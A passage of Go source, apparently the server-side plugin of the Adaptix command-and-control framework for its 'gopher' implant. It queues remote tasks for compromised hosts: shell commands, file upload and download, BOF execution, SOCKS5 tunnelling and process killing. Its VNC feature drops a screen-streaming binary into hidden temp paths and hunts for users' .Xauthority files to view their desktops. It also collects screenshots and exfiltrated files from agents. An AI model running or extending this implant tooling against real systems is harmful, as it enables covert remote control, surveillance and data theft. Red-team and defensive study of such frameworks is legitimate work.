		Data:   packData,
		Sync:   false,
	}

	return taskData, err
}

func resolveVncAgentDir() (string, error) {
	candidates := []string{
		filepath.Join(filepath.Dir(ModuleDir), "vnc", "agent"),
		filepath.Join(filepath.Dir(ModuleDir), "vnc", "dist", "agent"),
		filepath.Join(filepath.Dir(filepath.Dir(ModuleDir)), "vnc", "agent"),
		filepath.Join(filepath.Dir(filepath.Dir(ModuleDir)), "vnc", "dist", "agent"),
	}

	for _, candidate := range candidates {
		if info, err := os.Stat(candidate); err == nil && info.IsDir() {
			return candidate, nil
		}
	}

	return "", fmt.Errorf("vnc agent payload directory not found")
}

func vncStreamBinaryForAgent(agentData adaptix.AgentData) (string, string, string, error) {
	vncAgentDir, err := resolveVncAgentDir()
	if err != nil {
		return "", "", "", err
	}

	switch agentData.Os {
	case adaptix.OS_WINDOWS:
		remotePath := fmt.Sprintf("C:\\Windows\\Temp\\adaptix_vnc_%s_%08x.exe", agentData.Id, mrand.Uint32())
		return filepath.Join(vncAgentDir, "vnc_stream.exe"), remotePath, remotePath, nil
	case adaptix.OS_LINUX:
		remotePath := fmt.Sprintf("/tmp/.adaptix_vnc_%s_%08x", agentData.Id, mrand.Uint32())
		return filepath.Join(vncAgentDir, "vnc_stream_linux"), remotePath, "/bin/sh", nil
	default:
		return "", "", "", fmt.Errorf("vnc auto-start is not supported for this agent OS")
	}
}

type nativeVncPayloadFile struct {
	LocalPath  string
	RemotePath string
}

type nativeVncPayload struct {
	Files      []nativeVncPayloadFile
	RemoteDirs []string
	RemoteDir  string
	RunProgram string
	RunArgs    []string
}

func windowsRemoteJoin(base string, rel string) string {
	rel = filepath.ToSlash(rel)
	rel = strings.Trim(rel, "/")
	if rel == "." || rel == "" {
		return base
	}
	return base + "\\" + strings.ReplaceAll(rel, "/", "\\")
}

func shouldDeployNativeVncFile(name string) bool {
	name = strings.ToLower(name)
	if name == "vncconfig.exe" {
		return false
	}
	switch filepath.Ext(name) {
	case ".md", ".rst", ".txt":
		return false
	default:
		return true
	}
}

func resolveNativeVncPayload(agentData adaptix.AgentData, targetPort int) (nativeVncPayload, error) {
	var payload nativeVncPayload
	if agentData.Os != adaptix.OS_WINDOWS {
		return payload, fmt.Errorf("native VNC auto-start is only supported for Windows gopher agents")
	}

	vncAgentDir, err := resolveVncAgentDir()
	if err != nil {
		return payload, err
	}

	candidates := []string{
		filepath.Join(vncAgentDir, "native", "windows"),
		filepath.Join(vncAgentDir, "winvnc"),
	}
	var payloadDir string
	for _, candidate := range candidates {
		if info, statErr := os.Stat(candidate); statErr == nil && info.IsDir() {
			payloadDir = candidate
			break
		}
	}
	if payloadDir == "" {
		return payload, fmt.Errorf("native VNC payload directory not found; place winvnc.exe and support files under %s", filepath.Join(vncAgentDir, "native", "windows"))
	}

	payload.RemoteDir = fmt.Sprintf("C:\\Windows\\Temp\\adaptix_vnc_native_%s_%08x", agentData.Id, mrand.Uint32())
	remoteDirSet := map[string]struct{}{payload.RemoteDir: {}}
	var preferredExe string
	var fallbackExe string
	var startScript string

	err = filepath.WalkDir(payloadDir, func(path string, entry fs.DirEntry, walkErr error) error {
		if walkErr != nil {
			return walkErr
		}
		if path == payloadDir {
			return nil
		}

		rel, relErr := filepath.Rel(payloadDir, path)
		if relErr != nil {
			return relErr
		}
		remotePath := windowsRemoteJoin(payload.RemoteDir, rel)

		if entry.IsDir() {
			remoteDirSet[remotePath] = struct{}{}
			return nil
		}

		if !shouldDeployNativeVncFile(entry.Name()) {
			return nil
		}

		payload.Files = append(payload.Files, nativeVncPayloadFile{
			LocalPath:  path,
			RemotePath: remotePath,
		})

		name := strings.ToLower(entry.Name())
		if name == "adaptix_start.bat" || name == "adaptix_start.cmd" {
			startScript = remotePath
		}
		if strings.HasSuffix(name, ".exe") {
			if fallbackExe == "" {
				fallbackExe = remotePath
			}
			if name == "winvnc.exe" || name == "winvnc4.exe" || strings.Contains(name, "winvnc") {
				preferredExe = remotePath
			}
		}
		return nil
	})
	if err != nil {
		return payload, err
	}
	if len(payload.Files) == 0 {
		return payload, fmt.Errorf("native VNC payload directory is empty: %s", payloadDir)
	}

	for dir := range remoteDirSet {
		payload.RemoteDirs = append(payload.RemoteDirs, dir)
	}
	sort.Strings(payload.RemoteDirs)

	if startScript != "" {
		payload.RunProgram = "C:\\Windows\\System32\\cmd.exe"
		payload.RunArgs = []string{"/c", "call", startScript, strconv.Itoa(targetPort)}
		return payload, nil
	}

	remoteExe := preferredExe
	if remoteExe == "" {
		remoteExe = fallbackExe
	}
	if remoteExe == "" {
		return payload, fmt.Errorf("native VNC payload must include adaptix_start.bat/cmd or a VNC server exe")
	}

	payload.RunProgram = remoteExe
	if strings.Contains(strings.ToLower(filepath.Base(remoteExe)), "winvnc") {
		payload.RunArgs = []string{"-run"}
	}
	return payload, nil
}

func queueGopherUpload(agentId string, remotePath string, fileContent []byte) error {
	zipContent, err := ZipBytes(fileContent, remotePath)
	if err != nil {
		return err
	}

	const chunkSize = 0x500000 // 5Mb
	for start := 0; start < len(zipContent); start += chunkSize {
		fin := start + chunkSize
		if fin > len(zipContent) {
			fin = len(zipContent)
		}

		packerData, _ := msgpack.Marshal(ParamsUpload{
			Path:    remotePath,
			Content: zipContent[start:fin],
			Finish:  fin == len(zipContent),
		})
		cmd := Command{Code: COMMAND_UPLOAD, Data: packerData}
		taskData := adaptix.TaskData{
			Type:    adaptix.TASK_TYPE_TASK,
			AgentId: agentId,
			Sync:    false,
			TaskId:  fmt.Sprintf("%08x", mrand.Uint32()),
		}
		taskData.Data, _ = msgpack.Marshal(cmd)
		Ts.TsTaskCreate(agentId, "", "", taskData)
	}

	return nil
}

func queueGopherMkdir(agentId string, remotePath string) {
	packerData, _ := msgpack.Marshal(ParamsMkdir{Path: remotePath})
	cmd := Command{Code: COMMAND_MKDIR, Data: packerData}
	taskData := adaptix.TaskData{
		Type:    adaptix.TASK_TYPE_TASK,
		AgentId: agentId,
		Sync:    false,
		TaskId:  fmt.Sprintf("%08x", mrand.Uint32()),
	}
	taskData.Data, _ = msgpack.Marshal(cmd)
	Ts.TsTaskCreate(agentId, "", "", taskData)
}

func queueGopherRun(agentData adaptix.AgentData, program string, args []string) string {
	r := make([]byte, 4)
	_, _ = rand.Read(r)
	taskId := fmt.Sprintf("%08x", binary.BigEndian.Uint32(r))

	packerData, _ := msgpack.Marshal(ParamsRun{Program: program, Args: args, Task: taskId})
	cmd := Command{Code: COMMAND_RUN, Data: packerData}
	taskData := adaptix.TaskData{
		Type:    adaptix.TASK_TYPE_JOB,
		AgentId: agentData.Id,
		Sync:    true,
		TaskId:  taskId,
	}
	taskData.Data, _ = msgpack.Marshal(cmd)
	Ts.TsTaskCreate(agentData.Id, "", "", taskData)
	return taskId
}

func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}
	subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{
		Type: adaptix.TASK_TYPE_TASK,
		Sync: true,
	}

	messageData = adaptix.ConsoleMessageData{
		Status: adaptix.MESSAGE_INFO,
		Text:   "",
	}
	messageData.Message, _ = args["message"].(string)

	/// START CODE HERE

	var cmd Command

	switch command {

	case "cat":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsCat{Path: path})
		cmd = Command{Code: COMMAND_CAT, Data: packerData}

	case "cd":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsCd{Path: path})
		cmd = Command{Code: COMMAND_CD, Data: packerData}

	case "cp":
		src, err := getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err := getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsCp{Src: src, Dst: dst})
		cmd = Command{Code: COMMAND_CP, Data: packerData}

	case "download":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}

		r := make([]byte, 4)
		_, _ = rand.Read(r)
		taskId := binary.BigEndian.Uint32(r)

		taskData.TaskId = fmt.Sprintf("%08x", taskId)

		packerData, _ := msgpack.Marshal(ParamsDownload{Path: path, Task: taskData.TaskId})
		cmd = Command{Code: COMMAND_DOWNLOAD, Data: packerData}

	case "execute":
		// ★ 这里原来是 `if agentData.Os != adaptix.OS_WINDOWS { goto RET }` —— 直接跳出，
		//   err 仍为 nil。后果是**彻底的静默**：不建任务、不回报错、控制台一个字都没有
		//   （实测 Linux gopher：execute bof <绝对路径> 后 /api/agent/task/list 无新增）。
		//   操作员唯一的结论只会是「这功能坏了」，而真相是「这个 agent 没有 BOF 加载器」。
		//   BOF 是编译进 agent 载荷的能力，不是操作系统给的：同一台 Linux 上
		//   linux_agent 有、gopher 没有。说不出来，就等于没做。
		if agentData.Os != adaptix.OS_WINDOWS {
			err = fmt.Errorf("execute bof is not available on this agent: gopher has a BOF loader "+
				"only on Windows (this host reports os=%d). Use the agent's built-in commands, "+
				"or a linux agent (its BOFs are compiled at runtime on the server).", agentData.Os)
			goto RET
		}

		if subcommand == "bof" {
			taskData.Type = adaptix.TASK_TYPE_JOB

			r := make([]byte, 4)
			_, _ = rand.Read(r)
			taskId := binary.BigEndian.Uint32(r)

			taskData.TaskId = fmt.Sprintf("%08x", taskId)

			asyncMode := getBoolArg(args, "-a")

			bofFile, err := getStringArg(args, "bof")
			if err != nil {
				goto RET
			}
			bofContent, decodeErr := resolveBofObject(bofFile)
			if decodeErr != nil {
				err = decodeErr
				goto RET
			}

			paramData, ok := args["param_data"].(string)
			if !ok {
				paramData = ""
			}

			packerData, _ := msgpack.Marshal(ParamsExecBof{Object: bofContent, ArgsPack: paramData, Task: taskData.TaskId})
			if asyncMode {
				cmd = Command{Code: COMMAND_EXEC_BOF_ASYNC, Data: packerData}
			} else {
				cmd = Command{Code: COMMAND_EXEC_BOF, Data: packerData}
			}
		} else {
			err = errors.New("subcommand must be 'bof'")
			goto RET
		}

	case "exit":
		cmd = Command{Code: COMMAND_EXIT, Data: nil}

	case "job":
		if subcommand == "list" {
			cmd = Command{Code: COMMAND_JOB_LIST, Data: nil}

		} else if subcommand == "kill" {
			jobId, err := getStringArg(args, "task_id")
			if err != nil {
				goto RET
			}
			packerData, _ := msgpack.Marshal(ParamsJobKill{Id: jobId})
			cmd = Command{Code: COMMAND_JOB_KILL, Data: packerData}

		} else {
			err = errors.New("subcommand must be 'list' or 'kill'")
			goto RET
		}

	case "kill":
		pid, err := getFloatArg(args, "pid")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsKill{Pid: int(pid)})
		cmd = Command{Code: COMMAND_KILL, Data: packerData}

	case "ls":
		dir, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsLs{Path: dir})
		cmd = Command{Code: COMMAND_LS, Data: packerData}

	case "mv":
		src, err := getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err := getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsMv{Src: src, Dst: dst})
		cmd = Command{Code: COMMAND_MV, Data: packerData}

	case "mkdir":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsMkdir{Path: path})
		cmd = Command{Code: COMMAND_MKDIR, Data: packerData}

	case "ps":
		cmd = Command{Code: COMMAND_PS, Data: nil}

	case "pwd":
		cmd = Command{Code: COMMAND_PWD, Data: nil}

	case "rev2self":
		cmd = Command{Code: COMMAND_REV2SELF, Data: nil}

	case "rm":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsRm{Path: path})
		cmd = Command{Code: COMMAND_RM, Data: packerData}

	case "run":
		taskData.Type = adaptix.TASK_TYPE_JOB

		prog, err := getStringArg(args, "program")
		if err != nil {
			goto RET
		}
		runArgs, _ := args["args"].(string)

		r := make([]byte, 4)
		_, _ = rand.Read(r)
		taskId := binary.BigEndian.Uint32(r)

		taskData.TaskId = fmt.Sprintf("%08x", taskId)

		cmdArgs, _ := shlex.Split(runArgs)
		packerData, _ := msgpack.Marshal(ParamsRun{Program: prog, Args: cmdArgs, Task: taskData.TaskId})
		cmd = Command{Code: COMMAND_RUN, Data: packerData}

	case "shell":
		cmdParam, err := getStringArg(args, "cmd")
		if err != nil {
			goto RET
		}

		if agentData.Os == adaptix.OS_WINDOWS {
			cmdArgs := []string{"/c", cmdParam}
			packerData, _ := msgpack.Marshal(ParamsShell{Program: "C:\\Windows\\System32\\cmd.exe", Args: cmdArgs})
			cmd = Command{Code: COMMAND_SHELL, Data: packerData}
		} else {
			cmdArgs := []string{"-c", cmdParam}
			packerData, _ := msgpack.Marshal(ParamsShell{Program: "/bin/sh", Args: cmdArgs})
			cmd = Command{Code: COMMAND_SHELL, Data: packerData}
		}

	case "screenshot":
		cmd = Command{Code: COMMAND_SCREENSHOT, Data: nil}

	case "socks":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		portNumber, ok := args["port"].(float64)
		port := int(portNumber)
		if ok {
			if port < 1 || port > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}
		}
		if subcommand == "start" {
			address, err := getStringArg(args, "address")
			if err != nil {
				goto RET
			}

			auth := getBoolArg(args, "-a")
			if auth {
				username, err := getStringArg(args, "username")
				if err != nil {
					goto RET
				}
				password, err := getStringArg(args, "password")
				if err != nil {
					goto RET
				}

				tunnelId, err2 := Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, true, username, password)
				if err2 != nil {
					err = err2
					goto RET
				}
				taskData.TaskId, err2 = Ts.TsTunnelStart(tunnelId)
				if err2 != nil {
					err = err2
					goto RET
				}

				taskData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)

			} else {
				tunnelId, err2 := Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, false, "", "")
				if err2 != nil {
					err = err2
					goto RET
				}
				taskData.TaskId, err2 = Ts.TsTunnelStart(tunnelId)
				if err2 != nil {
					err = err2
					goto RET
				}

				taskData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
			}
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			taskData.Completed = true

			Ts.TsTunnelStopSocks(agentData.Id, port)

			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = "Socks5 server has been stopped"
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "upload":
		remote_path, err := getStringArg(args, "remote_path")
		if err != nil {
			goto RET
		}
		localFile, err := getStringArg(args, "local_file")
		if err != nil {
			goto RET
		}

		fileContent, decodeErr := base64.StdEncoding.DecodeString(localFile)
		if decodeErr != nil {
			err = decodeErr
			goto RET
		}

		zipContent, zipErr := ZipBytes(fileContent, remote_path)
		if zipErr != nil {
			err = zipErr
			goto RET
		}

		chunkSize := 0x500000 // 5Mb
		bufferSize := len(zipContent)

		inTaskData := adaptix.TaskData{
			Type:    adaptix.TASK_TYPE_TASK,
			AgentId: agentData.Id,
			Sync:    false,
		}

		for start := 0; start < bufferSize; start += chunkSize {
			fin := start + chunkSize
			finish := false
			if fin >= bufferSize {
				fin = bufferSize
				finish = true
			}

			inPackerData, _ := msgpack.Marshal(ParamsUpload{
				Path:    remote_path,
				Content: zipContent[start:fin],
				Finish:  finish,
			})
			inCmd := Command{Code: COMMAND_UPLOAD, Data: inPackerData}

			if finish {
				cmd = inCmd
				break

			} else {
				inTaskData.Data, _ = msgpack.Marshal(inCmd)
				inTaskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

				Ts.TsTaskCreate(agentData.Id, "", "", inTaskData)
			}
		}

	case "zip":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		zip_path, err := getStringArg(args, "zip_path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsZip{Src: path, Dst: zip_path})
		cmd = Command{Code: COMMAND_ZIP, Data: packerData}

	case "vnc":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		if subcommand == "start" {
			targetPortNumber, err1 := getFloatArg(args, "target_port")
			localPortNumber, err2 := getFloatArg(args, "local_port")
			if err1 != nil || err2 != nil {
				err = errors.New("usage: vnc start <target_port> <local_port>")
				goto RET
			}
			targetPort := int(targetPortNumber)
			localPort := int(localPortNumber)
			if targetPort < 1 || targetPort > 65535 || localPort < 1 || localPort > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}

			var localBinary string
			var remotePath string
			var program string
			localBinary, remotePath, program, err = vncStreamBinaryForAgent(agentData)
			if err != nil {
				goto RET
			}

			var vncBinary []byte
			vncBinary, err = os.ReadFile(localBinary)
			if err != nil {
				err = fmt.Errorf("failed to read vnc stream binary %s: %w", localBinary, err)
				goto RET
			}

			tunnelId, e := Ts.TsTunnelCreateLportfwd(agentData.Id, "VNC Desktop", "0.0.0.0", localPort, "127.0.0.1", targetPort)
			if e != nil {
				err = e
				goto RET
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				goto RET
			}

			err = queueGopherUpload(agentData.Id, remotePath, vncBinary)
			if err != nil {
				goto RET
			}

			var runArgs []string
			if agentData.Os == adaptix.OS_LINUX {
				runScript := fmt.Sprintf("export DISPLAY=${DISPLAY:-:0}; if [ -z \"$XAUTHORITY\" ]; then for f in \"$HOME/.Xauthority\" /root/.Xauthority /run/user/$(id -u)/gdm/Xauthority /run/user/$(id -u)/Xauthority /home/*/.Xauthority; do [ -r \"$f\" ] && export XAUTHORITY=\"$f\" && break; done; fi; for i in $(seq 1 50); do [ -s %q ] && break; sleep 0.2; done; chmod +x %q && %q --port %d --quality 75", remotePath, remotePath, remotePath, targetPort)
				runArgs = []string{"-c", runScript}
			} else {
				runArgs = []string{"--port", strconv.Itoa(targetPort), "--quality", "75", "--no-detach"}
			}
			runTaskId := queueGopherRun(agentData, program, runArgs)

			taskData.Message = fmt.Sprintf("VNC tunnel listening on local port %d; queued upload %s and run task %s for agent port %d. Open /vnc/viewer?local=%d after the run task starts.", localPort, remotePath, runTaskId, targetPort, localPort)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "native" {
			targetPortNumber, err1 := getFloatArg(args, "target_port")
			localPortNumber, err2 := getFloatArg(args, "local_port")
			if err1 != nil || err2 != nil {
				err = errors.New("usage: vnc native <target_port> <local_port>")
				goto RET
			}
			targetPort := int(targetPortNumber)
			localPort := int(localPortNumber)
			if targetPort < 1 || targetPort > 65535 || localPort < 1 || localPort > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}

			tunnelId, e := Ts.TsTunnelCreateLportfwd(agentData.Id, "Native VNC Desktop", "0.0.0.0", localPort, "127.0.0.1", targetPort)
			if e != nil {
				err = e
				goto RET
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				goto RET
			}

			taskData.Message = fmt.Sprintf("Native VNC tunnel started: teamserver port %d -> agent 127.0.0.1:%d. The client viewer opens automatically when the tunnel syncs.", localPort, targetPort)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "deploy" {
			targetPortNumber, err1 := getFloatArg(args, "target_port")
			localPortNumber, err2 := getFloatArg(args, "local_port")
			if err1 != nil || err2 != nil {
				err = errors.New("usage: vnc deploy <target_port> <local_port>")
				goto RET
			}
			targetPort := int(targetPortNumber)
			localPort := int(localPortNumber)
			if targetPort < 1 || targetPort > 65535 || localPort < 1 || localPort > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}

			var payload nativeVncPayload
			payload, err = resolveNativeVncPayload(agentData, targetPort)
			if err != nil {
				goto RET
			}

			fileContents := make([][]byte, len(payload.Files))
			for i, payloadFile := range payload.Files {
				fileContents[i], err = os.ReadFile(payloadFile.LocalPath)
				if err != nil {
					err = fmt.Errorf("failed to read native VNC payload %s: %w", payloadFile.LocalPath, err)
					goto RET
				}
			}

			tunnelId, e := Ts.TsTunnelCreateLportfwd(agentData.Id, "Native VNC Desktop", "0.0.0.0", localPort, "127.0.0.1", targetPort)
			if e != nil {
				err = e
				goto RET
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				goto RET
			}

			for _, remoteDir := range payload.RemoteDirs {
				queueGopherMkdir(agentData.Id, remoteDir)
			}
			for i, payloadFile := range payload.Files {
				err = queueGopherUpload(agentData.Id, payloadFile.RemotePath, fileContents[i])
				if err != nil {
					goto RET
				}
			}

			runTaskId := queueGopherRun(agentData, payload.RunProgram, payload.RunArgs)

			taskData.Message = fmt.Sprintf("Native VNC auto-start queued: upload %d file(s) to %s, run task %s on agent port %d, tunnel local port %d. The client viewer opens automatically when the tunnel syncs.", len(payload.Files), payload.RemoteDir, runTaskId, targetPort, localPort)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			portNumber, e := getFloatArg(args, "local_port")
			if e != nil {
				err = errors.New("usage: vnc stop <local_port>")
				goto RET
			}
			localPort := int(portNumber)
			Ts.TsTunnelStopLportfwd(agentData.Id, localPort)

			taskData.Message = fmt.Sprintf("VNC session on port %d stopped", localPort)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "view" {
			portNumber, e := getFloatArg(args, "local_port")
			if e != nil {
				portNumber = 41484
			}
			localPort := int(portNumber)
			taskData.Message = fmt.Sprintf("VNC Viewer: open /vnc/viewer?local=%d in browser after vnc_stream is listening on the agent", localPort)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "list" {
			taskData.Message = "Active VNC sessions can be viewed via the Tunnels tab. Look for VNC Desktop tunnels."
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be start, native, deploy, stop, view, or list")
			goto RET
		}

	default:
		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
		goto RET
	}

	taskData.Data, _ = msgpack.Marshal(cmd)

	/// END CODE

RET:
	return taskData, messageData, err
}

func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	var outTasks []adaptix.TaskData

	taskData := adaptix.TaskData{
		Type:        adaptix.TASK_TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: adaptix.MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	/// START CODE

	var (
		inMessage Message
		cmd       Command
		job       Job
	)

	err := msgpack.Unmarshal(decryptedData, &inMessage)
	if err != nil {
		return errors.New("failed to unmarshal message")
	}

	if inMessage.Type == 1 {

		for _, cmdBytes := range inMessage.Object {
			err = msgpack.Unmarshal(cmdBytes, &cmd)
			if err != nil {
				continue
			}

			TaskId := cmd.Id
			commandId := cmd.Code
			task := taskData
			task.TaskId = fmt.Sprintf("%08x", TaskId)

			switch commandId {

			case COMMAND_CAT:
				var params AnsCat
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("'%v' file content:", params.Path)
				task.ClearText = string(params.Content)

			case COMMAND_CD:
				var params AnsPwd
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Current working directory:"
				task.ClearText = params.Path

			case COMMAND_CP:
				task.Message = "Object copied successfully"

			case COMMAND_EXEC_BOF:

				var params AnsExecBof
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				var msgs []BofMsg
				err = msgpack.Unmarshal(params.Msgs, &msgs)
				if err != nil {
					continue
				}

				task.Message = "BOF output"

				for _, msg := range msgs {
					if msg.Type == CALLBACK_AX_SCREENSHOT {

						buf := bytes.NewReader(msg.Data)
						var length uint32
						if err := binary.Read(buf, binary.LittleEndian, &length); err != nil {
							continue
						}
						note := make([]byte, length)
						if _, err := buf.Read(note); err != nil {
							continue
						}
						screen := make([]byte, len(msg.Data)-4-int(length))
						if _, err := buf.Read(screen); err != nil {
							continue
						}

						_ = Ts.TsScreenshotAdd(agentData.Id, string(note), screen)

					} else if msg.Type == CALLBACK_AX_DOWNLOAD_MEM {
						buf := bytes.NewReader(msg.Data)
						var length uint32
						if err := binary.Read(buf, binary.LittleEndian, &length); err != nil {
							continue
						}
						filename := make([]byte, length)
						if _, err := buf.Read(filename); err != nil {
							continue
						}
						data := make([]byte, len(msg.Data)-4-int(length))
						if _, err := buf.Read(data); err != nil {
							continue
						}
						name := Ts.TsConvertCpToUTF8(string(filename), agentData.ACP)
						fileId := fmt.Sprintf("%08x", mrand.Uint32())
						_ = Ts.TsDownloadSave(agentData.Id, fileId, name, data)

					} else if msg.Type == CALLBACK_ERROR {
						task.MessageType = adaptix.MESSAGE_ERROR
						task.Message = "BOF error"
						task.ClearText += ensureNewline(Ts.TsConvertCpToUTF8(string(msg.Data), agentData.ACP))
					} else {
						task.ClearText += ensureNewline(Ts.TsConvertCpToUTF8(string(msg.Data), agentData.ACP))
					}
				}

			case COMMAND_EXIT:
				task.Message = "The agent has completed its work (kill process)"
				_ = Ts.TsAgentTerminate(agentData.Id, task.TaskId)

			case COMMAND_JOB_LIST:
				var params AnsJobList
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				var jobList []JobInfo
				err = msgpack.Unmarshal(params.List, &jobList)
				if err != nil {
					continue
				}

				Output := ""
				if len(jobList) > 0 {
					Output += fmt.Sprintf(" %-10s  %-13s\n", "JobID", "Type")
					Output += fmt.Sprintf(" %-10s  %-13s", "--------", "-------")

					for _, value := range jobList {
						stringType := "Unknown"
						if value.JobType == 0x2 {
							stringType = "Download"
						} else if value.JobType == 0x3 {
							stringType = "Process"
						} else if value.JobType == 0x6 {
							stringType = "Async BOF"
						}

						Output += fmt.Sprintf("\n %-10v  %-13s", value.JobId, stringType)
					}

					task.Message = "Job list:"
					task.ClearText = Output
				} else {
					task.Message = "No active jobs"
				}

			case COMMAND_JOB_KILL:
				task.Message = "Job killed"

			case COMMAND_LS:
				var params AnsLs
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				if agentData.Os == adaptix.OS_WINDOWS {

					var items []adaptix.ListingFileDataWin

					if !params.Result {
						task.Message = params.Status
						task.MessageType = adaptix.MESSAGE_ERROR
					} else {
						var Files []FileInfo
						err := msgpack.Unmarshal(params.Files, &Files)
						if err != nil {
							continue
						}

						filesCount := len(Files)
						if filesCount == 0 {
							task.Message = fmt.Sprintf("The '%s' directory is EMPTY", params.Path)
						} else {

							var folders []adaptix.ListingFileDataWin
							var files []adaptix.ListingFileDataWin

							for _, f := range Files {

								date := int64(0)
								t, err := time.Parse("02/01/2006 15:04", f.Date)
								if err == nil {
									date = t.Unix()
								}

								fileData := adaptix.ListingFileDataWin{
									IsDir:    f.IsDir,
									Size:     f.Size,
									Date:     date,
									Filename: f.Filename,
								}

								if f.IsDir {
									folders = append(folders, fileData)
								} else {
									files = append(files, fileData)
								}
							}

							items = append(folders, files...)

							OutputText := fmt.Sprintf(" %-8s %-14s %-20s  %s\n", "Type", "Size", "Last Modified      ", "Name")
							OutputText += fmt.Sprintf(" %-8s %-14s %-20s  %s", "----", "---------", "----------------   ", "----")

							for _, item := range items {
								t := time.Unix(item.Date, 0).UTC()
								lastWrite := fmt.Sprintf("%02d/%02d/%d %02d:%02d", t.Day(), t.Month(), t.Year(), t.Hour(), t.Minute())

								if item.IsDir {
									OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "dir", "", lastWrite, item.Filename)
								} else {
									OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "", SizeBytesToFormat(item.Size), lastWrite, item.Filename)
								}
							}
							task.Message = fmt.Sprintf("Listing '%s'", params.Path)
							task.ClearText = OutputText

						}
					}
					Ts.TsClientGuiFilesWindows(task, params.Path, items)

				} else {

					var items []adaptix.ListingFileDataUnix

					if !params.Result {
						task.Message = params.Status
						task.MessageType = adaptix.MESSAGE_ERROR
					} else {
						var Files []FileInfo
						err := msgpack.Unmarshal(params.Files, &Files)
						if err != nil {
							continue
						}

						filesCount := len(Files)
						if filesCount == 0 {
							task.Message = fmt.Sprintf("The '%s' directory is EMPTY", params.Path)
						} else {

							modeFsize := 1
							lnkFsize := 1
							userFsize := 1
							groupFsize := 1
							sizeFsize := 1
							dateFsize := 1

							for _, f := range Files {
								val := fmt.Sprintf("%d", f.Nlink)
								if len(val) > lnkFsize {
									lnkFsize = len(val)
								}
								val = fmt.Sprintf("%d", f.Size)
								if len(val) > sizeFsize {
									sizeFsize = len(val)
								}
								if len(f.Mode) > modeFsize {
									modeFsize = len(f.Mode)
								}
								if len(f.User) > userFsize {
									userFsize = len(f.User)
								}
								if len(f.Group) > groupFsize {
									groupFsize = len(f.Group)
								}
								if len(f.Date) > dateFsize {
									dateFsize = len(f.Date)
								}
							}

							format2 := fmt.Sprintf(" %%-%ds %%-%dd %%-%ds %%-%ds %%-%dd %%-%ds %%s", modeFsize, lnkFsize, userFsize, groupFsize, sizeFsize, dateFsize)
							OutputText := ""
							for _, fi := range Files {
								OutputText += fmt.Sprintf("\n"+format2, fi.Mode, fi.Nlink, fi.User, fi.Group, fi.Size, fi.Date, fi.Filename)

